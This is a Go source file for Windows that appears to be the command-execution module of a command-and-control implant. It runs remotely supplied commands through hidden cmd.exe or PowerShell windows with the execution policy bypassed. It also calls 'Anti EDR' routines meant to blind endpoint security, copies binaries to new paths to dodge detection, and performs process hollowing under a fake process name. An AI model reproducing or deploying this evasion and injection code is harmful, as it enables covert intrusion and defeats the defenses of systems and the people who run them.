// +build windows

package arch

/*
extern int InitSyscallsFromLdrpThunkSignature();
extern int Technique1();
*/
import "C"

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"io/ioutil"

	fp "path/filepath"

	"github.com/dobin/antnium/pkg/inject"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/charmap"
)

var antiEdrActive bool = false

func AntiEdr() error {
	if antiEdrActive {
		return nil
	}

	log.Info("Activate Anti EDR")
	ret := C.InitSyscallsFromLdrpThunkSignature()
	if ret == 0 {
		log.Error("AntiEDR: InitSyscallsFromLdrpThunkSignature error")
	}

	ret = C.Technique1()
	if ret == 0 {
		log.Error("AntiEDR: Technique1 error")
	}

	antiEdrActive = true

	return nil
}

// https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
func Permissions() (bool, bool, error) {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false, false, err
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		return false, false, err
	}

	// Also note that an admin is _not_ necessarily considered
	// elevated.
	// For elevation see https://github.com/mozey/run-as-admin

	isElevated := token.IsElevated()
	isAdmin := member
	return isElevated, isAdmin, nil
}

func ExecOutputDecode(data []byte) string {
	d := charmap.CodePage850.NewDecoder()
	outDecoded, err := d.Bytes(data)
	if err != nil {
		// Fall back to stdout if decoding failed
		return string(data)
	} else {
		return string(outDecoded)
	}
}

func hollow(source, replace, name string, args []string) (int, []byte, []byte, int, error) {
	//log.Infof("Replacing %s with %s", source, replace)
	data, _ := ioutil.ReadFile(replace)
	return inject.RunPE64(data, source, name, strings.Join(args, " "))
}

func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	stdOut = make([]byte, 0)
	stdErr = make([]byte, 0)
	pid = 0
	exitCode = 0
	err = nil

	processTimeout := 10 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()

	shellType, ok := packetArgument["shelltype"]
	if !ok {
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("no argument 'shelltype' given")
	}

	spawnType, ok := packetArgument["spawnType"]
	if !ok {
		spawnType = "standard"
	}
	spawnData, ok := packetArgument["spawnData"]
	if !ok {
		spawnData = ""
	}

	// Extract effective executable path and arguments
	var executable string
	var args []string
	switch shellType {
	case "cmd":
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}
		commandStr = ResolveWinPath(commandStr)
		executable = `C:\windows\system32\cmd.exe`
		x := fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
		args = []string{x}

	case "powershell":
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}
		commandStr = ResolveWinPath(commandStr)
		executable = `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`
		args = []string{"-ExecutionPolicy", "Bypass", "-C", commandStr}

	case "raw":
		executable, args, err = model.MakePacketArgumentFrom(packetArgument)
		executable = ResolveWinPath(executable)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
		}

	default:
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown a", shellType)
	}

	// Always resolve executable full path, we may need it
	executable = ResolveWinPath(executable)
	if filepath.Base(executable) == executable {
		if lp, err := exec.LookPath(executable); err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Could not resolve: %s", executable)
		} else {
			executable = lp
		}
	}

	/* Anti-EDR: copyFirst */
	if spawnType == "copyFirst" {
		destinationPath := spawnData
		destinationPath = ResolveWinPath(destinationPath)
		if destinationPath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
		}
		if !IsValidPath(destinationPath) {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Destination path invalid: %s", destinationPath)
		}

		err = CopyFile(executable, destinationPath)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
		}
		// Destination is the new binary we execute
		executable = destinationPath
	}

	cmd := exec.CommandContext(ctx, executable, args...)
	/* Fix up windows exceptions in process parameter handling */
	switch shellType {
	case "cmd":
		// cmd.exe is different
		cmd.SysProcAttr = getSysProcAttrs()
		cmd.SysProcAttr.CmdLine = args[0]

	case "powershell":
		// powershell.exe is different
		cmd.SysProcAttr = getSysProcAttrs()

	case "raw":
		// Nothing

	default:
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("shelltype %s unkown b", shellType)
	}

	log.Infof("Executing: %s %v", executable, args)

	// Inject?

	// See how we want to execute it
	if spawnType == "hollow" {
		// Perform Process Hollowing
		sourcePath := spawnData
		if sourcePath == "" {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
		}
		sourcePath = ResolveWinPath(sourcePath)
		if _, err := os.Stat(sourcePath); errors.Is(err, os.ErrNotExist) {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow destination exe does not exist: %s", sourcePath)
		}

		// Activate Anti-EDR if not yet done
		err = AntiEdr()
		if err != nil {
			log.Errorf("Anti EDR failed: %s", err.Error())
			// We dont care if it doesnt work. No return.
		}

		fakeName := filepath.Base(sourcePath) // Need it without path
		pid, stdOut, stdErr, exitCode, err = hollow(sourcePath, executable, fakeName, args)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
		}
	} else {
		// Execute the (possibly copied) binary directly
		stdOut, err = cmd.Output()
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok {
				stdErr = exitError.Stderr
				pid = exitError.Pid()
				exitCode = exitError.ProcessState.ExitCode()
			} else {
				pid = 0
				exitCode = cmd.ProcessState.ExitCode()

			}
		} else {
			pid = cmd.ProcessState.Pid()
			exitCode = cmd.ProcessState.ExitCode()
		}
	}

	return stdOut, stdErr, pid, exitCode, err
}

func getSysProcAttrs() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow: true,
	}
}

// from https://gitlab.com/stu0292/windowspathenv/-/blob/master/windowsPathEnv.go (No license)
// Resolve first element of a filepath as environment variable if enclosed in %. Only the first path element is considered as an environment variable. Eg:
// %GOPATH%/bin/gitlab.com/stu-b-doo/
func ResolveWinPath(filepath string) (out string) {
	// return the original filepath unchanged unless we get to the end
	out = filepath

	// return unless strings starts with %
	if !strings.HasPrefix(filepath, "%") {
		return
	}

	// return unless there's a second %
	trim := strings.TrimPrefix(filepath, "%")
	i := strings.Index(trim, "%")
	if i == -1 {
		return
	}

	varName := trim[:i]

	// check if substr between two % is the name of an existing env var
	val, ok := os.LookupEnv(varName)
	if !ok {
		return
	}

	// env var value will use os path separator
	remainder := fp.FromSlash(trim[i+1:])

	// check the remainder starts with path separateor
	if !strings.HasPrefix(remainder, "\\") {
		return
	}

	// prepend the value to the remainder of the path
	return val + remainder
}

func CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func IsValidPath(fp string) bool {
	// Check if file already exists
	if _, err := os.Stat(fp); err == nil {
		return true
	}

	// Attempt to create it
	var d []byte
	if err := ioutil.WriteFile(fp, d, 0644); err == nil {
		os.Remove(fp) // And delete it
		return true
	}

	return false
}
